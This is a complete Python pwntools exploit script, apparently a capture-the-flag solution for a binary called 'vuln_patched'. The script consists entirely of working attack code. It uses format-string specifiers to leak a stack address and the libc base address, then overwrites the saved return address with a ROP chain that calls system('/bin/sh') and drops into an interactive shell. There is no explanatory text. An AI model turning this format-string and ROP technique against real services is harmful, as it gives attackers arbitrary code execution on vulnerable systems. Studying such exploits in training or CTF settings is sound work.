#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 1337
HOST = "127.0.0.1"
exe = context.binary = ELF('./vuln_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            brva 0x0000000000001670
            brva 0x00000000000016D9
            brva 0x000000000000145F
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def show(data):
    p.sendlineafter(b'Choice: ', b'book')
    p.sendlineafter(b'here:\n', data)

# VARIABLE


# PAYLOAD
p.sendlineafter(b'Choice: ', f's %82p%72$hhn'.encode())
p.recvuntil(b'0x')
stack_leak = int(p.recvuntil(b'\n', drop=True), 16)
log.info("Stack leak: " + hex(stack_leak))
save_rip = stack_leak + 0x1a8

# Overwrite check
payload = b'%9$n%10$s%c%108$hhn'.ljust(0x18, b'\0')
payload += p64(save_rip + 0x10) + p64(stack_leak + 0xc0)
show(payload)
p.recvuntil(b'management:\n')
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - libc.sym._IO_2_1_stdout_
log.info("Libc base: " + hex(libc.address))
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym.system

p.sendlineafter(b'Choice: ', f's %82p%72$hhn'.encode())

# One_gadget: Impossible
pop_rdi = 0x000000000010f75b + libc.address
ret = pop_rdi + 1
writes = {
    save_rip + 0: pop_rdi,
    save_rip + 8: bin_sh,
    save_rip + 16: ret,
    save_rip + 24: system
}
payload = fmtstr_payload(6, writes=writes, write_size="short")
show(payload)

p.interactive()